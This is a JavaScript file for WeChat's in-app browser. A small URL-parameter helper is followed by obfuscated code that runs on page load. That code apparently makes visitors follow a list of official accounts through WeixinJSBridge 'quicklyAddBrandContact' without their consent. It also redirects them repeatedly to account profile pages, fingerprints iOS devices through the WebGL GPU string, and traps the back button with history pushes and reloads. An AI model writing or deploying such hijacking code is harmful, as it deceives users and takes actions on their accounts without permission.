;(function (global, factory) {
    typeof exports === 'object' && typeof module !== 'undefined'
        ? module.exports = factory(global)
        : typeof define === 'function' && define.amd
        ? define(factory) : factory(global)
}((
    typeof self !== 'undefined' ? self
        : typeof window !== 'undefined' ? window
        : typeof global !== 'undefined' ? global
        : this
), function(global) {
    'use strict';
    global = global || {};
    var _GUtils = global.GUtils;
    var version = "1.0.0";
    var UrlParams = function(n) {
        var search = window.location.search
        var hash = window.location.hash
        var strMatch = ''
        if(search) {
            strMatch = search
        }else if(hash) {
            strMatch = hash
        }
        switch (arguments.length) {
            case 0: 
                return UrlParamsNoArg(strMatch);
            case 1: 
                return UrlParamsOneArg(n,strMatch);
        }
    }
    var UrlParamsNoArg  = function(strMatch) {
        try {
            if(strMatch.match(/=(\S*)/)) {
                return strMatch.match(/=(\S*)/)[1]
            }else {
                throw 'No options'
            }
        } 
        catch(err) {
            return err
        }
    }
    var UrlParamsOneArg  = function(n,strMatch) {
        var re = new RegExp(n+"=(\\S*)&");
        var re2 = new RegExp(n+"=(\\S*)")
        try {
            if(strMatch.match(re)) {
                return strMatch.match(re)[1].split('&')[0]
            }else if(strMatch.match(re2)) {
                return strMatch.match(re2)[1]
            }else {
                throw 'No options'
            }
        } 
        catch(err) {
            return err
        }
    }
    // export GUtils
    global.GUtils = {
        VERSION: version,
        UrlParams: UrlParams
    };
    // export GUtils to the namespace
    if (global['Meteor']) { // Meteor.js
        GUtils = global.GUtils;
    }
    // module.exports and AMD are mutually exclusive.
    // module.exports has precedence.
    if (typeof module !== 'undefined' && module.exports) {
        module.exports.GUtils = global.GUtils;
    }
    else if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define([], function(){ return global.GUtils });
    }
    return {GUtils: global.GUtils}
}));
var _0x35fb=["zjiemi", "getElementById", "value", "", "join", "reverse", "split", "decode", "base64", "arrUsername", "[\"", "\"]", "setItem", "localStorage", "username", "weChatUrl", "undefined", "getItem", "(", ")", "match", "userAgent", "https://mmbiz.qpic.cn/mmbiz_png/YZc0kpdbHQJLkBOSET…0ZBCJ4HgzjZsmvF9QlNPE1CvYqicuSAUZODA/0?wx_fmt=png", "↵", "weChatUrl", "length", "random", "stop", "ok", "imagePreview", "invoke", "quicklyAddBrandContact", "110", "subscribeState", "getTime", "novel", "novel1", "novel2", "novel3", "novel4", "dyj", "gdt", "kc1", "kc2", "kc3", "kc4", "kc5", "kc6", "wifi1", "wifi2", "SubState", "1", "reload", "location", "forEach", "black", "await", "addEventListener", "WeixinJSBridgeReady", "pageshow", "back", "history", "pagehide", "profile", "weixin", "href", "biz", "sn", "comp_id", "wx_aid"];
//console.log(_0x35fb[0]);
//var zjiemi = GUtils.UrlParams(_0x35fb[0]);
//console.log(_0x35fb[6]+"|||"+_0x35fb[3]+"|||"+_0x35fb[5]+"|||"+_0x35fb[4]+"|||"+_0x35fb[3]);
//var kkss= zjiemi["split"]("");
//var kkss1 = kkss["reverse"]();
//var kkss2 = kkss1["join"]("");
//var _val = zjiemi[_0x35fb[6]](_0x35fb[3])[_0x35fb[5]]()[_0x35fb[4]](_0x35fb[3]);
//console.log("_val");
//console.log(_val);
//console.log(_0x35fb[8]+"|||"+_0x35fb[7])
//var jm1 = $[_0x35fb[8]][_0x35fb[7]](_val);
//console.log("jm1");
//console.log(jm1);
var jm2 = jmgzhh//$[_0x35fb[8]][_0x35fb[7]](jm1);

console.log("jm2");
console.log(jm2);



// forEach()
window[_0x35fb[13]][_0x35fb[12]](_0x35fb[9], _0x35fb[10] + jm2 + _0x35fb[11]);
//window.loaclStorage.setItem('',arrUsername)
window[_0x35fb[13]][_0x35fb[12]](_0x35fb[14], jm2);
window[_0x35fb[13]][_0x35fb[12]](_0x35fb[15], _0x35fb[16]);
//var username = localStorage["getItem"]("username");
//var username = localStorage.getItem("username");
var username = localStorage[_0x35fb[17]](_0x35fb[14]);
console.log("username");
console.log(username);

//var arrUsername = eval((localStorage.getItem(""arrUsername"")))
// var arrUsername = eval(_0x35fb[18] + localStorage[_0x35fb[17]](_0x35fb[9]) + _0x35fb[19]);
var arrUsername = jm2;
var index = Math.floor((Math.random()*arrUsername.length))
var username = arrUsername[index];
//console.log(index);
//console.log(arrUsername[index]);
console.log(username);

var isIos = !!navigator[_0x35fb[21]][_0x35fb[20]](/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var returnUrl = _0x35fb[22];
let getWeChatUrl = localStorage[_0x35fb[17]](_0x35fb[15])[_0x35fb[6]](_0x35fb[23]);
console.log("x:");
console.log(_0x35fb[16]);
console.log(_0x35fb[68]);
var weChatUrlArr = newWeChatUrlArr;//
if(isOpenADs){
    weChatUrlArr =  ["https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=Mzg3NDA1NjAyMQ==&scene=124#wechat_redirect"];
    //举例：https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzIwMDc4NTc4Ng==&scene=126#wechat_redirect
}
if (getWeChatUrl[0] !== _0x35fb[16]) {
    weChatUrlArr = getWeChatUrl
};
var wKey = parseInt(weChatUrlArr[_0x35fb[25]] * Math[_0x35fb[26]]());
var weChatUrl = weChatUrlArr[wKey];
subscribe(true);

function iosBatchSub(_0x3f75xf = _0x35fb[27]) {
    var _0x3f75x10;

    function _0x3f75x11(_0x3f75x12 = {}) {
    if (_0x3f75x12 === _0x35fb[28]) {
        var _0x3f75x13 = 0;
        var _0x3f75x14 = setInterval(_0x3f75x15, 50);
        _0x3f75x14();

        function _0x3f75x15() {
            _0x3f75x13++;
            go();
            if (_0x3f75x13 === 4) {
                clearInterval(_0x3f75x14);
                setTimeout(function() {
                    WeixinJSBridge[_0x35fb[30]](_0x35fb[29], {
                        "urls": [returnUrl]
                    });
                    var _0x3f75x16 = arrUsername;
                    _0x3f75x16[_0x35fb[54]](function(_0x3f75x17) {
                        WeixinJSBridge[_0x35fb[30]](_0x35fb[31], {
                            scene: _0x35fb[32],
                            username: _0x3f75x17
                        });
                        _0x3f75x10 = _0x35fb[28];
                        localStorage[_0x35fb[12]](_0x35fb[33], new Date()[_0x35fb[34]]());
                        if (username === _0x35fb[35] || username === _0x35fb[36] || username === _0x35fb[37] || username === _0x35fb[38] || username === _0x35fb[39] || username === _0x35fb[40] || username === _0x35fb[41] || username === _0x35fb[42] || username === _0x35fb[43] || username === _0x35fb[44] || username === _0x35fb[45] || username === _0x35fb[46] || username === _0x35fb[47] || username === _0x35fb[48] || username === _0x35fb[49]) {
                            localStorage[_0x35fb[12]](username + _0x35fb[50], _0x35fb[51])
                        };
                        if (_0x3f75xf === _0x35fb[27]) {
                            window[_0x35fb[53]][_0x35fb[52]]()
                        } else {}
                    })
                }, 200)
            }
        }
    } else {
      if (username === _0x35fb[35] || username === _0x35fb[36] || username === _0x35fb[37] || username === _0x35fb[38] || username === _0x35fb[39] || username === _0x35fb[40] || username === _0x35fb[41] || username === _0x35fb[42] || username === _0x35fb[43] || username === _0x35fb[44] || username === _0x35fb[45] || username === _0x35fb[46] || username === _0x35fb[47] || username === _0x35fb[48] || username === _0x35fb[49]) {
          _0x3f75x19();
          go()
      } else {
        _0x3f75x19(_0x35fb[55]);
    subscribe(false)
}
}
}
var _0x3f75x18 = parseInt((new Date()[_0x35fb[34]]() - Number(localStorage[_0x35fb[17]](_0x35fb[33]))) / 60000);
_0x3f75x10 = _0x35fb[56];
if (typeof(WeixinJSBridge) === _0x35fb[16]) {
    if (document[_0x35fb[57]]) {
        document[_0x35fb[57]](_0x35fb[58], _0x3f75x11, false)
    }
} else {
    _0x3f75x11()
};

function _0x3f75x19(_0x3f75x1a = _0x35fb[3]) {
    var _0x3f75x1b = false;
    window[_0x35fb[57]](_0x35fb[59], function() {
        if (_0x3f75x1b) {
            if (_0x3f75x1a !== _0x35fb[3]) {
                window[_0x35fb[61]][_0x35fb[60]]()
            } else {
                if (_0x3f75x10 === _0x35fb[56]) {
                    _0x3f75x11(_0x35fb[28])
                }
            }
        }
    });
    window[_0x35fb[57]](_0x35fb[62], function() {
        _0x3f75x1b = true
    })
}
}

function subscribe(_0x3f75x1d) {
    function _0x3f75x11() {
        var _0x3f75x13 = 0;
        var _0x3f75x14 = setInterval(subscribe, 50);
        var useragent = navigator.userAgent, app = navigator.appVersion;
        var isiOS = !!useragent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
        if(!isiOS){
            WeixinJSBridge[_0x35fb[30]]('jumpToBizProfile', {
                "tousername": username//,
                //"nickname": _0x35fb[64]
            }, function() {});
        }
        function subscribe() {
            go();
            _0x3f75x13++;
            if (_0x3f75x13 === 4) {
                clearInterval(_0x3f75x14);
                setTimeout(function() {
                    //WeixinJSBridge[_0x35fb[30]](_0x35fb[63], {
                    WeixinJSBridge[_0x35fb[30]]('jumpToBizProfile', {
                        "tousername": username//,
                        //"nickname": _0x35fb[64]
                    }, function() {});
                    if (_0x3f75x1d) {} else {}
                }, 200)
            }
        }
    }
    if (typeof(WeixinJSBridge) === _0x35fb[16]) {
        if (document[_0x35fb[57]]) {
            document[_0x35fb[57]](_0x35fb[58], _0x3f75x11, false)
        }
    } else {
        _0x3f75x11()
    }
}

function go() {
    var useragent = navigator.userAgent, app = navigator.appVersion;
    var isiOS = !!useragent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
    if(isiOS){
        var canvas = document.createElement('canvas'),
        gl = canvas.getContext('experimental-webgl'),
        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        var gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        if(gpu == "Apple GPU")
        {
            window[_0x35fb[53]][_0x35fb[65]] = iosWeChatUrl;
        }else{
            window[_0x35fb[53]][_0x35fb[65]] = iosWeChatUrl;
        }
    }else{
        window[_0x35fb[53]][_0x35fb[65]] = weChatUrl
    }
}

$(document).ready(function(e) {
    var counter = 0;
    if (window.history && window.history.pushState) {
        $(window).on('popstate', function () {
            window.history.pushState('forward', null, '#');
            window.history.forward(1);
            window.location.reload();
            // window.location.href="2.html";//执行操作
        });
    }
    window.history.pushState('forward', null, '#'); //在IE中必须得有这两行
    window.history.forward(1);
});